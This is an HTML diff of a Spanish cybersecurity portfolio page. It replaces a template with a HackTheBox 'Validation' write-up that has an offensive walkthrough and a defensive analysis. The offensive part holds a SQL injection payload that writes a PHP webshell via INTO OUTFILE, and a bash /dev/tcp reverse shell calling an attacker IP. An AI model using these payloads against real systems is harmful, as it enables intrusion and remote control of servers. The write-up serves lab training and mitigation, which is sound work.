@@ -31,237 +31,89 @@
             </div>
         </nav>
     </header>
+    <section class="hero">
+        <div class="hero-content">
+          <h1>HackTheBox - Validation</h1>
+          <p>Write-Up técnico y análisis defensivo de la máquina "Validation".</p>
+          <a href="#ofensivo" class="btn">Explotación</a>
+          <a href="#defensivo" class="btn btn-outline">Análisis Defensivo</a>
+        </div>
+      </section>
     
-        <main class="writeup-content">
-            <article>
-                <div class="writeup-header">
-                    <div class="writeup-meta">
-                        <span class="date">Fecha: 31 de marzo, 2025</span>
-                        <span class="tags">
-                            <span class="tag">Web</span>
-                            <span class="tag">SQLi</span>
-                        </span>
-                        <span class="difficulty">Dificultad: Media</span>
-                    </div>
-                    <h1>Título del Write-Up</h1>
-                    <div class="author">Por: Julieth Botello</div>
-                </div>
-                    
-                        <div class="toc">
-                                <h2>Tabla de Contenidos</h2>
-                                <div class="toc-content">
-                                
-                                    <ul>
-                                        <li><a href="#introduccion">Introducción</a></li>
-                                        <li><a href="#reconocimiento">Reconocimiento</a></li>
-                                        <li><a href="#vulnerabilidad">Identificación de la Vulnerabilidad</a></li>
-                                        <li><a href="#explotacion">Explotación</a></li>
-                                        <li><a href="#post-explotacion">Post-Explotación</a></li>
-                                        <li><a href="#mitigacion">Mitigación</a></li>
-                                        <li><a href="#conclusion">Conclusión</a></li>
-                                    </ul>
-                                </div>   
-                        </div>              
-                    
-                <section id="introduccion">
-                    <h2>Introducción</h2>
-                    <p>
-                        Aquí debes proporcionar una breve descripción del sistema objetivo, el alcance de tu análisis y los objetivos que te has propuesto alcanzar. Explica también el contexto y la importancia de este write-up.
-                    </p>
-                    <div class="info-box">
-                        <h4><i class="fas fa-info-circle"></i> Entorno</h4>
-                        <ul>
-                            <li><strong>Objetivo:</strong> Nombre/IP del sistema</li>
-                            <li><strong>Plataforma:</strong> HackTheBox, Vulnhub, etc.</li>
-                            <li><strong>Dificultad:</strong> Fácil, Media, Difícil</li>
-                            <li><strong>Fecha:</strong> Cuándo realizaste este trabajo</li>
-                        </ul>
-                    </div>
-                </section>
-
-                <section id="reconocimiento">
-                    <h2>Reconocimiento</h2>
-                    <p>
-                        Detalla el proceso de enumeración y reconocimiento que realizaste para identificar posibles vectores de ataque.
-                    </p>
-                    <h3>Escaneo de Puertos</h3>
-                    <p>Resultados del escaneo con herramientas como Nmap.</p>
-                    
-                    <pre><code class="language-bash">$ nmap -sV -sC -p- 10.10.10.10
-                    Starting Nmap 7.92 ( https://nmap.org )
-                    Nmap scan report for target.com (10.10.10.10)
-                    Host is up (0.023s latency).
-                    Not shown: 65530 closed ports
-                    PORT    STATE SERVICE  VERSION
-                    22/tcp  open  ssh      OpenSSH 8.2p1
-                    80/tcp  open  http     Apache httpd 2.4.46
-                    443/tcp open  https    Apache httpd 2.4.46
-                    </code></pre>
-
-                    <h3>Enumeración Web</h3>
-                    <p>Información recopilada durante la fase de reconocimiento web.</p>
-                    <div class="image-container">
-                        <img src="../assets/images/example-screenshot.png" alt="Captura de pantalla del sitio web">
-                        <span class="caption">Figura 1: Página inicial del objetivo.</span>
-                    </div>
-                </section>
-
-                <section id="vulnerabilidad">
-                    <h2>Identificación de la Vulnerabilidad</h2>
-                    <p>
-                        Explica cómo identificaste la vulnerabilidad, qué tecnologías estaban implicadas, y por qué era explotable.
-                    </p>
-                    <div class="warning-box">
-                        <h4><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad Identificada</h4>
-                        <p>
-                            Describe la vulnerabilidad (por ejemplo, SQLi, XSS, RCE) con detalles técnicos suficientes para que otros entiendan la naturaleza del problema.
-                        </p>
-                    </div>
-                    <p>
-                        Aquí puedes incluir ejemplos de código vulnerable, salidas de herramientas de análisis, o explicaciones paso a paso de cómo descubriste la vulnerabilidad.
-                    </p>
-                    <pre><code class="language-php">// Ejemplo de código vulnerable
-                    $id = $_GET['id'];
-                    $query = "SELECT * FROM products WHERE product_id = $id"; // Vulnerable a SQLi
-                    $result = mysqli_query($conn, $query);
-                    </code></pre>
-                </section>
-
-                <section id="explotacion">
-                    <h2>Explotación</h2>
-                    <p>
-                        Detalla el proceso de explotación paso a paso, incluyendo las herramientas y técnicas utilizadas.
-                    </p>
-                    <h3>Desarrollo del Exploit</h3>
-                    <p>
-                        Explica cómo desarrollaste o utilizaste un exploit para aprovechar la vulnerabilidad.
-                    </p>
-                    <pre><code class="language-python"># Ejemplo de script de explotación
-                    import requests
-
-                    url = "http://target.com/vulnerable.php"
-                    payload = "1' UNION SELECT username,password FROM users -- -"
-
-                    response = requests.get(f"{url}?id={payload}")
-                    print(response.text)
-                    </code></pre>
-
-                    <h3>Ejecución del Ataque</h3>
-                    <p>
-                        Muestra el resultado de la ejecución del exploit y cómo lograste acceso.
-                    </p>
-                    <div class="image-container">
-                        <img src="../assets/images/example-exploit.png" alt="Resultado de la explotación">
-                        <span class="caption">Figura 2: Resultado exitoso de la explotación.</span>
-                    </div>
-                </section>
-
-                <section id="post-explotacion">
-                    <h2>Post-Explotación</h2>
-                    <p>
-                        Describe las actividades realizadas después de obtener acceso inicial: escalada de privilegios, movimiento lateral, etc.
-                    </p>
-                    <h3>Escalada de Privilegios</h3>
-                    <p>
-                        Explica cómo escalaste privilegios en el sistema, si fue aplicable.
-                    </p>
-                    <pre><code class="language-bash">$ sudo -l
-                    User www-data may run the following commands on target:
-                        (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
-
-                    $ cat /opt/backup.py
-                    import os
-                    import zipfile
-                    # El resto del script...
-                    </code></pre>
-                </section>
-
-                <section id="mitigacion">
-                    <h2>Mitigación</h2>
-                    <p>
-                        Proporciona recomendaciones sobre cómo mitigar o corregir la vulnerabilidad explotada.
-                    </p>
-                    <div class="success-box">
-                        <h4><i class="fas fa-shield-alt"></i> Recomendaciones de Seguridad</h4>
-                        <ul>
-                            <li>Utilizar consultas parametrizadas para prevenir SQLi</li>
-                            <li>Actualizar el software vulnerable a la última versión</li>
-                            <li>Implementar un WAF para proteger contra ataques web comunes</li>
-                            <li>Seguir el principio de mínimo privilegio</li>
-                        </ul>
-                    </div>
-                    <p>
-                        Código corregido como ejemplo:
-                    </p>
-                    <pre><code class="language-php">// Código corregido
-                    $id = $_GET['id'];
-                    $stmt = $conn->prepare("SELECT * FROM products WHERE product_id = ?");
-                    $stmt->bind_param("i", $id); // Consulta parametrizada segura
-                    $stmt->execute();
-                    $result = $stmt->get_result();
-                    </code></pre>
-                </section>
-
-                <section id="conclusion">
-                    <h2>Conclusión</h2>
-                    <p>
-                        Resume los hallazgos clave, lecciones aprendidas y la importancia de abordar este tipo de vulnerabilidades.
-                    </p>
-                    <p>
-                        Menciona también cualquier técnica o herramienta nueva que hayas aprendido durante este proceso.
-                    </p>
-                </section>
-
-                <div class="tags-section">
-                    <h4>Etiquetas:</h4>
-                    <div class="tags-list">
-                        <a href="#" class="tag">SQLi</a>
-                        <a href="#" class="tag">Web</a>
-                        <a href="#" class="tag">Apache</a>
-                        <a href="#" class="tag">PHP</a>
-                    </div>
-                </div>
-
-                <div class="share-section">
-                    <h4>Compartir:</h4>
-                    <div class="social-share">
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-linkedin"></i></a>
-                        <a href="#"><i class="fab fa-facebook"></i></a>
-                    </div>
-                </div>
-            </article>
-
-            <aside class="sidebar">
-                <div class="author-info">
-                    <img src="../assets/images/profile.jpg" alt="Foto de perfil">
-                    <h3>Tu Nombre</h3>
-                    <p>Profesional en Ciberseguridad especializado en pentesting y análisis de vulnerabilidades.</p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-github"></i>github</a>
-                        <a href="#"><i class="fab fa-linkedin"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                    </div>
-                </div>
-
-                <div class="related-writeups">
-                    <h3>Write-Ups Relacionados</h3>
-                    <ul>
-                        <li><a href="#">Explotación de XSS en Aplicación Web</a></li>
-                        <li><a href="#">Bypass de Autenticación en Portal de Servicios</a></li>
-                        <li><a href="#">Análisis de Seguridad en API REST</a></li>
-                    </ul>
-                </div>
-            </aside>
-        </main>
-    </div>
-   
+      <!-- Sección OFENSIVA -->
+      <section class="section" id="ofensivo">
+        <h2>Write-Up Técnico: Explotación paso a paso</h2>
+    
+        <h3>1. Escaneo de Puertos (Nmap)</h3>
+        <pre><code>nmap -p- -sCV 10.10.11.116 --min-rate 1000</code></pre>
+        <ul>
+          <li>22/tcp - SSH</li>
+          <li>80/tcp - HTTP</li>
+          <li>4566/tcp - HTTP</li>
+          <li>8080/tcp - HTTP</li>
+        </ul>
+    
+        <h3>2. Enumeración Web</h3>
+        <p>El sitio web permite registrar un usuario con un campo "country", vulnerable a SQLi de segundo orden.</p>
+    
+        <h3>3. Inyección SQL (Union/Error-Based)</h3>
+        <pre><code>' UNION SELECT null, @@version, null --</code></pre>
+    
+        <h3>4. Webshell vía INTO OUTFILE</h3>
+        <pre><code>' UNION SELECT "&lt;?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --</code></pre>
+    
+        <h3>5. Shell Inversa (Netcat)</h3>
+        <pre><code>// En tu máquina local
+    nc -lvnp 4444
+    
+    // Desde la webshell
+    http://10.10.11.116/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'</code></pre>
+    
+        <h3>6. Escalada a Usuario</h3>
+        <p>Se extraen credenciales desde <code>config.php</code> para cambiar a un usuario con privilegios.</p>
+    
+        <h3>7. Escalada a Root</h3>
+        <pre><code>sudo -l</code></pre>
+        <p>Un script ejecutable sin contraseña permite modificar <code>PATH</code> para obtener shell como root.</p>
+    
+        <figure>
+          <img src="imagenes/validation.png" alt="HTB Validation Shell" />
+          <figcaption>Figura: Escalada a root usando shell.php y sudo misconfigurado.</figcaption>
+        </figure>
+      </section>
+    
+      <!-- Sección DEFENSIVA -->
+      <section class="section" id="defensivo">
+        <h2>Análisis Defensivo</h2>
+    
+        <h3>1. Fallo: SQL Injection de Segundo Orden</h3>
+        <p><strong>Causa:</strong> El parámetro <code>country</code> se usa sin sanitización.</p>
+        <p><strong>Impacto:</strong> Permite manipular consultas SQL y ejecutar comandos en el servidor.</p>
+        <p><strong>Mitigación:</strong> Usar consultas preparadas y validaciones del lado servidor.</p>
+    
+        <h3>2. Fallo: Permisos excesivos en MySQL</h3>
+        <p><strong>Impacto:</strong> El atacante escribe archivos en el sistema usando <code>INTO OUTFILE</code>.</p>
+        <p><strong>Mitigación:</strong> Restringir permisos de escritura a usuarios MySQL. Usar roles mínimos.</p>
+    
+        <h3>3. Fallo: Configuración insegura (config.php)</h3>
+        <p><strong>Impacto:</strong> Credenciales sensibles expuestas en archivos legibles.</p>
+        <p><strong>Mitigación:</strong> Almacenar secretos en variables de entorno. Proteger archivos con permisos estrictos.</p>
+    
+        <h3>4. Fallo: Escalada mediante Sudo</h3>
+        <p><strong>Impacto:</strong> El script mal configurado se puede manipular vía entorno.</p>
+        <p><strong>Mitigación:</strong> Validar scripts y comandos definidos en <code>/etc/sudoers</code>. Usar rutas absolutas.</p>
+    
+        <figure>
+          <img src="imagenes/validation-defensivo.png" alt="HTB Validation Defensivo" />
+          <figcaption>Figura: Análisis de vectores de ataque y malas prácticas de seguridad.</figcaption>
+        </figure>
+    </section>
+    
     <footer>
-        <p>&copy; 2025 Mi Portafolio de Ciberseguridad. Todos los derechos reservados.</p>
+        <p>&copy; 2025 Mabel Julieth Trujillo. Todos los derechos reservados.</p>
     </footer>
-
-    <!-- Scripts -->
-    <script src="js/main.js"></script>
     
+    <script src="js/main.js"></script>
 </body>
-</html>
+</html>   
+ 
